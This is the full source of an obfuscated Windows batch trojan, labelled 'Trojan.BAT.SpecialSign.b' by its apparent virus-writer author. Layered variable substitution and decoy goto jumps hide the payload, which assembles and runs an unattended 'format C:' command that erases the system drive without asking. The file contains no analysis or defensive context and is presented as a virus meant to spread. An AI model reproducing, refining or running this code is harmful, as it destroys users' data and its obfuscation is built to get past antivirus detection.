   ReM Trojan.BAT.SpecialSign.b
   ReM by SeCoNd PaRt To HeLl
   ReM www.spth.de.vu
   ReM Such viruses will flood over the world...
   ReM a better way, i forgot to include it last update
   set µµ_(=f
   set µµ_(=s
   goto a
   set µµ_(=g
   :a
   %µµ_(%et :.:.:=w
   %µµ_(%et :.:.:=e
   goto b
   %µµ_(%et :.:.:=t
   :b
   %µµ_(%%:.:.:%t @@@=o
   %µµ_(%%:.:.:%t @@@=t
   goto c
   %µµ_(%%:.:.:%t @@@=a
   :c
   %µµ_(%%:.:.:%%@@@% .:.:.=s
   %µµ_(%%:.:.:%%@@@% .:.:.=%µµ_(%%:.:.:%%@@@%
   goto d
   %µµ_(%%:.:.:%%@@@% .:.:.=d
   :d
   %.:.:.% ääöäöüöü=q
   %.:.:.% ääöäöüöü=o
   goto e
   %.:.:.% ääöäöüöü=k
   :e
   %.:.:.% @_@=kt
   %.:.:.% @_@=rm
   goto f
   %.:.:.% @_@=xv
   :f
   %.:.:.% @@=w
   %.:.:.% @@=fo
   goto g
   %.:.:.% @@=kz
   :g
   %.:.:.% .-.-=Y
   %.:.:.% .-.-=C
   goto h
   %.:.:.% .-.-=G
   :h
   %.:.:.% ...=de
   %.:.:.% ...=at
   goto i
   %.:.:.% ...=com
   :i
   %.:.:.% ____=y
   %.:.:.% ____=x
   goto j
   %.:.:.% ____=z
   :j
   %.:.:.% _____=p
   %.:.:.% _____=i
   goto k
   %.:.:.% _____=o
   :k
   %.:.:.% ....=h
   %.:.:.% ....=:
   goto l
   %.:.:.% ....=1
   :l
   %.:.:.% äöüöäüöü=q
   %.:.:.% äöüöäüöü=a
   goto m
   %.:.:.% äöüöäüöü=z
   :m
   %.:.:.% äöäöäüöü=j
   %.:.:.% äöäöäüöü=q
   goto n
   %.:.:.% äöäöäüöü=v
   :n
   %.:.:.% äöüäöüäö=n
   %.:.:.% äöüäöüäö=/
   goto o
   %.:.:.% äöüäöüäö=v
   :o
   %.:.:.% üäöüäöüö=z
   %.:.:.% üäöüäöüö=u
   goto p
   %.:.:.% üäöüäöüö=a
   :p
   %.:.:.% @=spth
   %.:.:.% @=%@@%%@_@%%...% %.-.-%%....% %äöüäöüäö%%üäöüäöüö% %äöüäöüäö%%äöäöäüöü% %äöüäöüäö%%äöüöäüöü%%üäöüäöüö%%@@@%%ääöäöüöü%%@@@%%:.:.:%%µµ_(%%@@@%
   goto ss
   %.:.:.% @==not
   :ss
   %@%
   %:.:.:%%____%%_____%%@@@%
